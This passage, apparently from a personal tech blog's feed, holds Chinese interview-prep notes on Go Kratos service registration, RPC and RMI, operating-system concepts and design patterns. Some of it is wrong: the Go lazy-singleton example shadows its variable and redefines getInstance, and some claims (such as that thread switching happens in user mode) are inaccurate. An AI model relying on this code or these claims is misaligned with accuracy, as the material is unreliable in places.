class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    consul <span class="string">"github.com/go-kratos/kratos/contrib/registry/consul/v2"</span></span><br><span class="line">    <span class="string">"github.com/hashicorp/consul/api"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// new consul client</span></span><br><span class="line">client, err := api.NewClient(api.DefaultConfig())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// new reg with consul client</span></span><br><span class="line">reg := consul.New(client)</span><br><span class="line"></span><br><span class="line">app := kratos.New(</span><br><span class="line">    <span class="comment">// service-name</span></span><br><span class="line">    kratos.Name(Name),</span><br><span class="line">    kratos.Version(Version),</span><br><span class="line">    kratos.Metadata(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;&#125;),</span><br><span class="line">    kratos.Logger(logger),</span><br><span class="line">    kratos.Server(</span><br><span class="line">        hs,</span><br><span class="line">        gs,</span><br><span class="line">    ),</span><br><span class="line">    <span class="comment">// with registrar</span></span><br><span class="line">    kratos.Registrar(reg),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="用的是kratos的负载均衡器"><a href="#用的是kratos的负载均衡器" class="headerlink" title="用的是kratos的负载均衡器"></a>用的是kratos的负载均衡器</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Selector <span class="keyword">interface</span> &#123;</span><br><span class="line">  <span class="comment">// Selector 内部维护的服务节点列表通过 Rebalancer 接口来更新</span></span><br><span class="line">  Rebalancer</span><br><span class="line">  <span class="comment">// Select nodes</span></span><br><span class="line">  <span class="comment">// if err == nil, selected and done must not be empty.</span></span><br><span class="line">  Select(ctx context.Context, opts ...SelectOption) </span><br><span class="line">        (selected Node, done DoneFunc, err error)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 Rebalancer 实现服务节点变更感知</span></span><br><span class="line"><span class="keyword">type</span> Rebalancer <span class="keyword">interface</span> &#123;</span><br><span class="line">  Apply(nodes []Node)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用的默认的wrr算法 Weighted round robin</p><h2 id="rpc是什么-远程过程调用-和rmi的区别【RMI相当于RPC的一种实现】"><a href="#rpc是什么-远程过程调用-和rmi的区别【RMI相当于RPC的一种实现】" class="headerlink" title="rpc是什么 远程过程调用 和rmi的区别【RMI相当于RPC的一种实现】"></a>rpc是什么 远程过程调用 和rmi的区别【RMI相当于RPC的一种实现】</h2><ul><li><p>RPC (Remote Procedure Call) 采用客户端/服务器方式 (请求/响应)，发送请求到服务器端，服务端执行方法后返回结果。 优点是跨语言跨平台，缺点是编译期无法排错。返回的对象由外部数据表示</p></li><li><p>RMI (Remote Method Invocation) 客户端jvm调用服务端jvm的方法，直接获取远端方法的签名，进行调用。优点是强类型、编译期可检查错误；缺点是只限于java语言。返回的对象可以是java支持的所有对象名。</p></li></ul><p>RPC的代理类stub，将消息序列化为RPCrequest/RPCresponse</p><h2 id="RMI流程原理"><a href="#RMI流程原理" class="headerlink" title="RMI流程原理"></a>RMI流程原理</h2><ul><li><p>定义远程接口<code>interface Rmiiface extends Remote</code></p></li><li><p>实现一个远程接口类<code>MyRemoteObject implements Rmiiface</code></p></li><li><p>服务器端注册和查找远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Rmiiface remoteObject = <span class="keyword">new</span> MyRemoteObject();</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>); <span class="comment">// 默认 RMI 注册表端口号为 1099</span></span><br><span class="line">            registry.bind(<span class="string">"MyRemoteObject"</span>, remoteObject);</span><br><span class="line">            System.out.println(<span class="string">"Server is ready."</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>客户端查找注册表来获取远程方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>, <span class="number">1099</span>);</span><br><span class="line">            MyRemoteInterface remoteObject = (MyRemoteInterface) registry.lookup(<span class="string">"MyRemoteObject"</span>);</span><br><span class="line">            String response = remoteObject.sayHello();</span><br><span class="line">            System.out.println(response);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>通过JRMP协议来通信</p><h3 id="grpc"><a href="#grpc" class="headerlink" title="grpc"></a>grpc</h3><p>基于protobuf序列化协议的通讯协议</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> DigitalTwins </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Operating System</title>
      <link href="/2023/01/05/2023-01-05-%E9%9D%A2%E7%BB%8F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/01/05/2023-01-05-%E9%9D%A2%E7%BB%8F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p> questions</p><a id="more"></a><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><ul><li>线程安全（Thread Safety）：</li></ul><p>当多个线程访问某个类或者对象时，如果不需要额外的同步机制或者用户干预，这个类或者对象依然能够表现出正确的行为，那么它就被认为是线程安全的。<br>简而言之，线程安全意味着在多线程环境下，对象的状态不会发生不一致或者不正确的情况。</p><ul><li>线程不安全（Thread Unsafe）：</li></ul><p>相反，当多个线程访问某个类或者对象时，如果没有适当的同步措施，就可能导致对象的状态变得不可预测或者不正确，那么这个类或者对象就是线程不安全的。<br>在线程不安全的情况下，多个线程可能会在同一时间访问、修改相同的数据，这可能导致数据损坏或者不一致。</p><h1 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h1><ul><li><p>进程是系统资源分配的基本单位，一个程序对应一个进程。每个进程都有自己独立的内存空间，相互之间不会共享。它包括了程序代码、内存空间、资源和文件等。</p></li><li><p>线程是进程中的<strong>执行单元</strong>，一个进程可以包含多个线程。线程共享了进程的内存空间和资源，可以同时执行不同的任务。</p></li></ul><h3 id="共享资源指的是哪些资源"><a href="#共享资源指的是哪些资源" class="headerlink" title="共享资源指的是哪些资源"></a>共享资源指的是哪些资源</h3><p>内存、全局变量、对象、文件等</p><h1 id="协程和线程的区别"><a href="#协程和线程的区别" class="headerlink" title="协程和线程的区别"></a>协程和线程的区别</h1><p>协程（goroutine）可以理解为轻量化的用户态线程的实现，区别是<br><strong>协程由goruntime进行调度，线程由操作系统内核调度</strong></p><h1 id="进程切换："><a href="#进程切换：" class="headerlink" title="进程切换："></a>进程切换：</h1><ul><li>保存当前进程上下文：当操作系统决定要切换到另一个进程时，首先会保存当前进程的上下文信息，包括寄存器的值、程序计数器（PC）等。</li><li>加载目标进程的上下文：接下来，操作系统会从进程调度队列中选择一个新的进程，将其保存的上下文信息加载到 CPU 寄存器中，以便开始执行该进程。</li><li>切换页表：在多进程的环境下，<strong>每个进程都有自己独立的地址空间</strong>（虚拟内存），因此在切换进程时，需要将当前进程的页表（用于地址映射）切换为目标进程的页表。</li><li>恢复执行：一旦目标进程的上下文信息被加载，CPU 会从目标进程的上次停止的位置继续执行。</li></ul><h2 id="与线程切换的区别："><a href="#与线程切换的区别：" class="headerlink" title="与线程切换的区别："></a>与线程切换的区别：</h2><ul><li>线程切换发生在用户态，进程切换发生在内核态。</li><li>线程切换相对于进程切换来说更加轻量级，因为线程共享了同一地址空间和其他资源，上下文切换的开销较小。</li></ul><h1 id="进程间的通信方式"><a href="#进程间的通信方式" class="headerlink" title="进程间的通信方式"></a>进程间的通信方式</h1><ul><li><strong>共享内存</strong> </li><li><strong>管道</strong> 半双工</li><li><strong>信号</strong> signal ，用于处理异步事件，如外部中断、错误、异常等情况</li><li><strong>信号量</strong> semaphore（mutex）实现进程间的互斥与同步，int计数器</li><li><strong>消息队列</strong> 保存在内核中的消息链表<h1 id="线程同步的方式有哪些"><a href="#线程同步的方式有哪些" class="headerlink" title="线程同步的方式有哪些"></a>线程同步的方式有哪些</h1></li><li><strong>互斥锁</strong></li><li><strong>读写锁</strong></li><li><strong>自旋锁</strong> 适用于锁被持有时间较短的情况：线程尝试获得锁时，如果锁已被占用，线程会一直忙等待直到锁被释放</li><li><strong>信号量</strong></li><li><strong>条件变量</strong></li><li><strong>原子操作</strong></li></ul><h1 id="fork子进程与父进程的区别"><a href="#fork子进程与父进程的区别" class="headerlink" title="fork子进程与父进程的区别"></a>fork子进程与父进程的区别</h1><p>在调用 fork() 函数时，操作系统会创建一个新的进程，这个新的进程称为子进程。子进程是父进程的一个复制，它将继承父进程的内存空间、文件描述符等资源。<br>fork之后，子进程和父进程之间是完全独立进行，互不干扰。</p><h1 id="死锁定义-amp-产生条件"><a href="#死锁定义-amp-产生条件" class="headerlink" title="死锁定义&amp; 产生条件"></a>死锁定义&amp; 产生条件</h1><p>定义：<br>死锁（Deadlock）是指在多个进程或线程之间，每个进程或线程都在等待一个事件，而这个事件只能由其他等待的进程或线程触发，从而导致所有进程或线程都无法继续执行的一种状态。</p><p>产生条件</p><ul><li>互斥（Mutual Exclusion）：资源只能被一个进程或线程占用，如果资源被占用，其他进程或线程必须等待。</li><li>持有和等待（Hold and Wait）：一个进程或线程可以在持有某个资源的同时等待其他资源，这时如果其他资源被占用，就会导致死锁。</li><li>不可剥夺（No Preemption）：资源不能被强制从一个进程或线程中抢占，只能由占用它的进程或线程显式释放。</li><li>循环等待（Circular Wait）：多个进程或线程之间形成一个环路。</li></ul><h1 id="进程调度策略"><a href="#进程调度策略" class="headerlink" title="进程调度策略"></a>进程调度策略</h1><ul><li>先来先服务</li><li>短进程优先</li><li>时间片轮转</li><li>优先级队列</li><li>多级反馈队列<h1 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h1></li><li>先进先出</li><li>最近最久未使用（手撕）</li></ul><h1 id="磁盘调度"><a href="#磁盘调度" class="headerlink" title="磁盘调度"></a>磁盘调度</h1><ul><li>先来先服务</li><li>最短寻道优先</li><li>扫描算法<h1 id="分页是什么，内存页面"><a href="#分页是什么，内存页面" class="headerlink" title="分页是什么，内存页面"></a>分页是什么，内存页面</h1>分页是操作系统中一种内存管理技术。</li></ul><p>优势 </p><ul><li>虚拟内存的实现：允许程序使用比实际物理内存更大的地址空间。</li><li>分页策略：可以实现页面置换算法，将不常用的页置换到磁盘上。</li><li>内存保护：可以将页设置为只读或只执行，从而保护程序的关键部分不被修改。</li><li>内存共享：多个进程可以共享相同的物理页，减少了内存的占用。</li></ul><h1 id="分段是什么，存在碎片问题"><a href="#分段是什么，存在碎片问题" class="headerlink" title="分段是什么，存在碎片问题"></a>分段是什么，存在碎片问题</h1><p>与分页不同，分段不将内存划分为固定大小的块，而是将其划分为逻辑上相关联的段，每个段的长度可以不同。</p><p>优势</p><ul><li>更灵活的内存管理：可以根据程序的需要分配不同大小的段，更好地利用内存。</li><li>更好的地址空间划分：可以将程序的不同部分（如代码、数据、堆栈等）放置在不同的段中，提高了程序的可读性和可维护性。</li><li>内存保护：可以通过设置段的权限（如只读、读写等）来保护程序的关键部分，防止非法访问。</li><li>共享和动态加载：不同程序可以共享相同的段，也可以在运行时动态加载和卸载段。</li></ul><p>使用场景</p><ul><li>动态链接库（DLL）：在操作系统中，动态链接库通常会以独立的段来存放，这样可以在运行时被加载和卸载。</li><li>程序的逻辑结构：将程序的不同部分（如代码段、数据段、堆栈段等）放置在不同的段中，可以使程序的逻辑结构更清晰，提高可读性和可维护性。</li><li>内存保护：可以通过设置段的权限来保护程序的关键部分，防止非法访问。例如，将代码段设置为只读，防止在运行时修改代码</li></ul><h1 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h1><p>通过将程序的逻辑地址空间映射到物理内存或磁盘上的存储空间来实现。<br>实现技术：分页和分段技术</p><h1 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h1><p>时间局部性：如果一个数据项被访问，那么在不久的将来它很可能再次被访问。这意味着程序往往会重复使用相同的数据。</p><p>空间局部性：如果一个数据项被访问，那么在它附近的数据也很可能会被访问。这意味着程序往往会以块或连续区域的方式访问数据。</p><h1 id="交换空间（Swap分区）"><a href="#交换空间（Swap分区）" class="headerlink" title="交换空间（Swap分区）"></a>交换空间（Swap分区）</h1><p>当物理内存不足时，操作系统会将一部分不常用的数据（可能是程序的代码、数据等）从物理内存移动到磁盘上的交换文件（Swap File）或者交换分区（Swap Partition）中。这样，物理内存就会腾出空间来运行当前活动的程序。当需要访问被移到交换空间的数据时，操作系统会将其再次加载到物理内存中。</p><h1 id="缓冲区泄漏"><a href="#缓冲区泄漏" class="headerlink" title="缓冲区泄漏"></a>缓冲区泄漏</h1><p>当程序向缓冲区写入超过其容量的数据时，会覆盖相邻内存区域的数据或者控制程序的执行流程，从而可能导致程序崩溃或者执行意外的行为。</p><ul><li>程序崩溃：如果溢出的数据覆盖了程序关键的数据或者控制信息，可能会导致程序崩溃或异常终止。</li><li>提权漏洞：如果一个程序以特权用户或系统管理员的身份运行，并且存在缓冲区溢出漏洞，攻击者可以利用这个漏洞来提升自己的权限，获取对系统的控制权。</li><li>执行恶意代码：攻击者可以通过精心构造的输入数据来覆盖程序的返回地址或者函数指针，从而强行将程序执行流程转移到恶意代码所在的地址，实现远程代码执行攻击。</li><li>信息泄露：攻击者可以利用缓冲区溢出漏洞来读取程序内部的数据，可能包括敏感信息、密码等。</li></ul><h1 id="僵尸进程和孤儿进程"><a href="#僵尸进程和孤儿进程" class="headerlink" title="僵尸进程和孤儿进程"></a>僵尸进程和孤儿进程</h1><h2 id="僵尸进程：子进程结束，父进程不知道"><a href="#僵尸进程：子进程结束，父进程不知道" class="headerlink" title="僵尸进程：子进程结束，父进程不知道"></a>僵尸进程：子进程结束，父进程不知道</h2><p>定义：僵尸进程是已经结束执行的子进程，但其父进程尚未调用wait()或waitpid()系统调用来获取子进程的退出状态，因此子进程的资源（如进程表项、文件描述符等）尚未被完全释放。</p><p>状态：僵尸进程处于”Z”状态（在ps命令中以”Z”标识），找到Z状态kill掉。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep Z</span><br><span class="line">kill -s SIGCHLD &lt;PID&gt; </span><br><span class="line">#SIGCHLD信号是一个用于通知父进程子进程状态变化的信号。通过向僵尸进程发送这个信号</span><br></pre></td></tr></table></figure><p>危害：僵尸进程占用了系统资源（如进程表项），如果大量的僵尸进程积累，可能会导致系统资源不足。</p><h2 id="孤儿进程：父进程结束，子进程还在执行，会被init进程接管"><a href="#孤儿进程：父进程结束，子进程还在执行，会被init进程接管" class="headerlink" title="孤儿进程：父进程结束，子进程还在执行，会被init进程接管"></a>孤儿进程：父进程结束，子进程还在执行，会被init进程接管</h2><p>定义：孤儿进程是指一个子进程的父进程提前结束了，而子进程还在继续运行。此时，子进程会被init进程（PID为1）接管，成为init的子进程。<br>状态：孤儿进程的状态正常，不会变成僵尸进程，因为init进程会负责回收孤儿进程的资源。<br>危害：一般情况下，孤儿进程并不会造成严重问题。但如果大量的孤儿进程在系统中运行，可能会占用系统资源，因此最好的做法是在父进程退出前，确保它的子进程已经正确地结束。</p><h1 id="重点：IO多路复用"><a href="#重点：IO多路复用" class="headerlink" title="重点：IO多路复用"></a>重点：IO多路复用</h1><p>IO Multiplexing是指通过一种机制<strong>同时监听多个文件描述符（sockets、文件、设备等）</strong>，当其中任意一个文件描述符就绪（可读、可写或异常）时，就可以对其进行相应的处理，从而提高了系统的性能和响应速度。</p><ul><li>select 轮训，在一个数组中注册多个文件描述符，数据量少时效果好</li><li>数据结构：数组</li><li>poll 轮训，数据量多时效果好</li><li>数据结构：链表</li><li>epoll 使用了事件驱动的方式来管理文件描述符，只有当文件描述符真正就绪时才会通知应用程序</li><li>数据结构：红黑树</li></ul><p>优点：相对于select和poll，epoll的性能更高，因为它采用了红黑树的数据结构来管理文件描述符，可以处理大量的文件描述符，并且在文件描述符就绪时会立即得到通知。</p><h1 id="硬连接-软连接"><a href="#硬连接-软连接" class="headerlink" title="硬连接 软连接"></a>硬连接 软连接</h1><p>硬连接</p><ul><li>硬链接与原文件共享同一个索引节点，具有相同的 Inode 号。</li><li>不能连接目录，防止形成环<br>软连接</li><li>软链接是一个单独的文件，其中包含了指向目标文件的路径信息。</li><li>能连接目录</li></ul><h1 id="中断的处理过程"><a href="#中断的处理过程" class="headerlink" title="中断的处理过程"></a>中断的处理过程</h1><ol><li>中断触发，事件可能包括定时器结束，系统调用，异常等</li><li>中断请求，向CPU发送通知，我要处理一个终端</li><li>中断控制器（Interrupt Controller）将中断请求映射到一个中断向量，对应了中断处理程序的入口地址，是映射关系，类似于函数指针。</li><li>根据中断向量表将中断向量映射到实际的中断处理程序的入口地址。</li><li>保存上下文</li><li>执行中断服务程序</li><li>关中断</li><li>恢复现场后，<strong>重新执行产生中断的那一句指令</strong></li></ol><h1 id="中断和轮训"><a href="#中断和轮训" class="headerlink" title="中断和轮训"></a>中断和轮训</h1><ol><li>触发条件不同，中断是被动条件触发（定时器结束、产生异常），轮训是主动查询资源状体啊</li><li>响应能力不同，中断实时发生，论文有延迟</li><li>轮训同步，中断异步</li></ol><h1 id="零拷贝"><a href="#零拷贝" class="headerlink" title="零拷贝"></a>零拷贝</h1><p>零拷贝是一种优化数据传输的技术，它通过<strong>减少或消除数据在内存之间的复制过程</strong>来提高传输效率，从而在高性能的数据传输场景中发挥重要作用。</p><ol><li>传递文件描述符</li><li>允许内核缓冲区直接访问</li><li>DMA</li><li>sendfile() 将一个文件描述符的内容发给另一个</li><li>mmap()文件映射到内存</li></ol><p><strong>Redis：</strong><br>Redis 通过使用 sendfile 系统调用，实现了零拷贝技术，可以在文件传输时避免数据在用户空间和内核空间之间的多次拷贝。</p><p><strong>Kafka：</strong><br>Kafka 在数据的生产者和消费者之间使用了零拷贝技术。生产者将数据<strong>直接写入内核缓冲区</strong>，消费者从内核缓冲区直接读取数据，避免了中间的数据拷贝过程。</p><h1 id="堆和栈的区别"><a href="#堆和栈的区别" class="headerlink" title="堆和栈的区别"></a>堆和栈的区别</h1><p><strong>分配管理</strong></p><ul><li>栈由编译器管理，自动分配和释放内存，函数调用时分配，并在函数返回时自动释放。</li><li>堆通常用于存储动态分配的数据，由程序员手动管理内存的分配和释放。<code>malloc()、calloc()、realloc()</code></li></ul><p><strong>存储内容</strong><br>栈用于存储函数的局部变量和控制信息<br>堆用于存储动态分配的数据，如动态数组、对象等。<br><strong>大小和位置</strong></p><ul><li>栈的大小是固定有限的，由系统在程序启动时分配，每个函数调用时，都会创建一个称为帧（Frame）的区域来存储这些信息</li><li>堆大小不固定，位置不固定</li></ul><h2 id="CPU占用率-使用率-负载"><a href="#CPU占用率-使用率-负载" class="headerlink" title="CPU占用率 使用率 负载"></a>CPU占用率 使用率 负载</h2><p>CPU占用率、使用率和负载是监控和评估计算机系统性能的三个不同方面。</p><p><strong>CPU占用率（CPU Usage）：</strong><br>CPU占用率是指计算机CPU处理任务的效率和利用率。它通常以百分比的形式表示，表示CPU正在执行任务的时间占总时间的比例。例如，一个CPU占用率为50%的系统表示CPU一半的时间用于处理任务，一半的时间处于空闲状态。</p><p><strong>CPU使用率（CPU Utilization）：</strong><br>CPU使用率是指实际用于处理计算任务的CPU时间与总时间的比例。它反映了CPU的工作效率，是一个反映计算机性能的重要指标。CPU使用率可以分为用户态使用率、内核态使用率等不同类型。</p><p><strong>负载（Load Average）：</strong><br>负载是一个相对于一段时间内系统CPU运算负荷的指标。通常以三个数值表示，分别表示系统在过去1分钟、5分钟和15分钟内的负载情况。例如，一个负载为1.0的系统表示在平均1分钟内，有一个任务在运行。</p><p><strong>区别总结：</strong></p><p>CPU占用率关注的是CPU执行任务的效率，以百分比表示。<br>CPU使用率关注的是实际用于处理任务的CPU时间占总时间的比例，也以百分比表示，但更偏向于反映CPU的工作效率。<br>负载关注的是系统的整体负担情况，包括CPU、内存、磁盘等资源的占用情况，以及等待队列中的任务数。</p><h2 id="Linux进程间通信：管道（匿名管道和有名管道）、信号、消息队列、共享内存、信号量、套接字（socket）"><a href="#Linux进程间通信：管道（匿名管道和有名管道）、信号、消息队列、共享内存、信号量、套接字（socket）" class="headerlink" title="Linux进程间通信：管道（匿名管道和有名管道）、信号、消息队列、共享内存、信号量、套接字（socket）"></a>Linux进程间通信：管道（匿名管道和有名管道）、信号、消息队列、共享内存、信号量、套接字（socket）</h2><h2 id="Linus线程间通信：互斥量、信号量、条件变量"><a href="#Linus线程间通信：互斥量、信号量、条件变量" class="headerlink" title="Linus线程间通信：互斥量、信号量、条件变量"></a>Linus线程间通信：互斥量、信号量、条件变量</h2><h2 id="linux启动"><a href="#linux启动" class="headerlink" title="linux启动"></a>linux启动</h2><p>主板加电BIOS，加电自检<br>引导系统的Boot Loader<br>grub配置文件读取，加载内核<br>用户层init进程执行rc.syninit<br>初始化内核模块<br>初始化用户空间的init</p><p>执行/etc/rc.d/rc.local(本地运行服务)<br>执行/bin/login,就可以登录了。</p><h2 id="linux删除命令rm，发生了什么"><a href="#linux删除命令rm，发生了什么" class="headerlink" title="linux删除命令rm，发生了什么"></a>linux删除命令rm，发生了什么</h2><p>linux文件系统里，用inode保存文件的数据结构，rm本质上是删除了这个inode和文件名的关联，然后文件的引用计数减少，当一个文件引用计数减少到0时，系统释放空间</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式</title>
      <link href="/2023/01/05/2023-01-05-%E9%9D%A2%E7%BB%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2023/01/05/2023-01-05-%E9%9D%A2%E7%BB%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p> questions</p><a id="more"></a><h1 id="设计模式六大原则"><a href="#设计模式六大原则" class="headerlink" title="设计模式六大原则"></a>设计模式六大原则</h1><p>开闭原则：软件实体（类、函数、模块）对扩展开放，对修改封闭</p><p>单一职责：每个类只做它负责的事情（一个类应该只有一个引起它修改的原因）<br>里氏替换：子类可以完全代替父类</p><p>依赖倒置：细节依赖于抽象，抽象不依赖于细节，程序细节由底层完成</p><p>最少知道：迪米特法则，尽量降低类与类之间的耦合。一个类不应该知道自己操作的类的细节</p><p>接口隔离：一个接口实现时，如果有冗余，就应该把接口拆分，让实现的类只依赖自己需要的接口，客户端不应依赖于它不知道的接口</p><h1 id="创造型模式"><a href="#创造型模式" class="headerlink" title="创造型模式"></a>创造型模式</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">工厂方法模式：为每一类对象建立工厂，将对象交由工厂创建，客户端只和工厂打交道。</span><br><span class="line">抽象工厂模式：为每一类工厂提取出抽象接口，使得新增工厂、替换工厂变得非常容易。</span><br><span class="line">建造者模式：用于创建构造过程稳定的对象，不同的 Builder 可以定义不同的配置。</span><br><span class="line">单例模式：全局使用同一个对象，分为饿汉式和懒汉式。懒汉式有双检锁和内部类两种实现方式。</span><br><span class="line">原型模式：为一个类定义 clone 方法，使得创建相同的对象更方便。</span><br></pre></td></tr></table></figure><p>饿汉：变量在声明时便初始化，但饿汉式有一个弊端，那就是即使这个单例不需要使用，它也会在类加载之后立即创建出来，占用一块内存，并增加类初始化时间。<br>懒汉：先声明一个空变量，需要用时才初始化。懒汉式解决了饿汉式的弊端，好处是按需加载，避免了内存浪费，减少了类初始化时间。<br>    - 但是懒汉不是线程安全的，要实现线程安全的懒汉，需要加同步锁</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"sync"</span><span class="comment">// 同步包</span></span><br><span class="line"><span class="keyword">type</span> Singleton <span class="keyword">struct</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//饿汉</span></span><br><span class="line"><span class="keyword">var</span> instance *Singleton = &amp;Singleton&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInstance</span><span class="params">()</span> *<span class="title">Singleton</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> instance</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//懒汉线程安全</span></span><br><span class="line"><span class="keyword">var</span> once sync.Once</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInstance</span><span class="params">()</span> *<span class="title">Singleton</span></span>&#123;</span><br><span class="line">    once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">        instance := &amp;Singleton&#123;&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> instance</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>工厂模式</strong><br><strong>抽象工厂模式</strong><br><strong>单例模式</strong><br><strong>建造者模式</strong><br><strong>原型模式</strong></p><h1 id="结构型模式"><a href="#结构型模式" class="headerlink" title="结构型模式"></a>结构型模式</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">适配器模式：用于有相关性但不兼容的接口</span><br><span class="line">桥接模式：用于同等级的接口互相组合</span><br><span class="line">组合模式：用于整体与部分的结构</span><br><span class="line">外观模式：体现封装的思想</span><br><span class="line">享元模式：体现面向对象的可复用性</span><br><span class="line">代理模式：主要用于对某个对象加以控制</span><br></pre></td></tr></table></figure><p><strong>适配器模式</strong><br><strong>装饰器模式</strong><br><strong>代理模式</strong><br><strong>享元模式</strong>：享元模式的主要目的是实现对象的共享，即共享池，当系统中对象多的时候可以减少内存的开销，通常与工厂模式一起使用。</p><p>FlyWeightFactory负责创建和管理享元单元，当一个客户端请求时，工厂需要检查当前对象池中是否有符合条件的对象，如果有，就返回已经存在的对象，如果没有，则创建一个新对象，FlyWeight是超类。<br>一提到共享池，我们很容易联想到Java里面的JDBC连接池，想想每个连接的特点，我们不难总结出：适用于作共享的一些个对象，他们有一些共有的属性，就拿数据库连接池来说，url、driverClassName、username、password及dbname，这些属性对于每个连接来说都是一样的，所以就适合用享元模式来处理，建一个工厂类，将上述类似属性作为内部数据，其它的作为外部数据，在方法调用时，当做参数传进来，这样就节省了空间，减少了实例的数量。</p><p><strong>外观模式</strong><br><strong>桥接模式</strong><br><strong>组合模式</strong></p><h1 id="行为型模式"><a href="#行为型模式" class="headerlink" title="行为型模式"></a>行为型模式</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 